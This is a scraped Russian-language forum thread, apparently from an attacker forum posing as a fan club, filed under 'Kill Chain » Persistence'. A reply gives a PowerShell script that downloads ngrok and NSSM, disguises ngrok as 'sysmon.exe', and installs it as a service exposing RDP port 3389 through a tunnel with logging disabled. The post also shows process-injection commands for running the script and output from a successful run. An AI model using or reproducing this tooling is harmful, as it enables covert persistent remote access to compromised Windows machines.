@@ -1,0 +1,151 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Ngrok
+
+Ngrok
+Alter · 2 · 55
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:33:04 am
+Записан
+
+Post
+
+Slice
+
+    Administrator
+    Member
+    *****
+        1
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Апреля 28, 2021, 10:10:10 pm
+Записан
+
+NGROK v2 (only official solution)
+
+    регистрируем аккаунт через который будет идти соединение на оф сайте https://dashboard.ngrok.com/signup
+    сразу запрашиваем доступ на странице https://dashboard.ngrok.com/endpoints/status
+    на странице https://dashboard.ngrok.com/get-started/setup забираем ngrok.exe (https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip) и апи ключ
+    install_ngrok.ps1
+
+
+Код: [Выделить]
+
+function NewNgrok ($apikey, $localngrok, $localnssm) {
+	if (!($apikey)) {throw "NGROK API KEY NEEDED"}
+	mkdir "C:\Windows\tmp"
+
+	if (!($localngrok) -or !(Test-path $localngrok)) {
+		write-output "download ngrok"
+		$clnt = new-object System.Net.WebClient
+		$url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
+		$file = "C:\Windows\tmp\ngrok.zip"
+		$clnt.DownloadFile($url,$file)
+	} else {
+		$file = $localngrok
+	}
+	
+	$shell_app=new-object -com shell.application
+	$zip_file = $shell_app.namespace($file)
+	$destination = $shell_app.namespace("C:\Windows\tmp\")
+	$destination.Copyhere($zip_file.items())
+
+	sleep 20
+
+	if (!($localnssm) -or !(Test-path $localnssm)) {
+		write-output "download nssm"
+		$clnt = new-object System.Net.WebClient
+		$url = "http://nssm.cc/release/nssm-2.24.zip"
+		$file = "C:\Windows\tmp\nssm.zip"
+		$clnt.DownloadFile($url,$file)
+	} else {
+		$file = $localnssm
+	}
+
+	$shell_app=new-object -com shell.application
+	$zip_file = $shell_app.namespace($file)
+	$destination = $shell_app.namespace("C:\Windows\tmp")
+	$destination.Copyhere($zip_file.items())
+
+
+	Rename-Item -Path "C:\Windows\tmp\ngrok.exe" -NewName "sysmon.exe"
+
+
+@"
+authtoken: $apikey
+tunnels:
+   default:
+       proto: tcp
+       addr: 3389
+"@ > "C:\Windows\tmp\config.yml"
+
+
+
+	cd  "C:\Windows\tmp\nssm-2.24\win64"
+	.\nssm.exe install sysmon C:\Windows\tmp\sysmon.exe start --all --region us --config "C:\Windows\tmp\config.yml" --log "false"
+
+	Start-Service sysmon
+}
+
+
+    powershell-import install_ngrok.ps1
+    psinject 123 x64 NewNgrok "APIKEY" ЛИБО при ошибке скрипта со скачиванием с ресурсов указываем локальные архивы
+    psinject 123 x64 NewNgrok "APIKEY" "C:\path\to\ngrok.zip" "C:\path\to\nssm.zip"
+
+
+вывод:
+Цитировать
+
+        Directory: C:\Windows
+
+
+    Mode                LastWriteTime         Length Name                                         
+    ----                -------------         ------ ----                                         
+    d-----        4/28/2021  12:46 PM                tmp                                           
+    download ngrok
+    download nssm
+    S e r v i c e   " s y s m o n "   i n s t a l l e d   s u c c e s s f u l l y !
+
+« Последнее редактирование: Апреля 29, 2021, 02:26:25 am от Slice »
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Ngrok
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
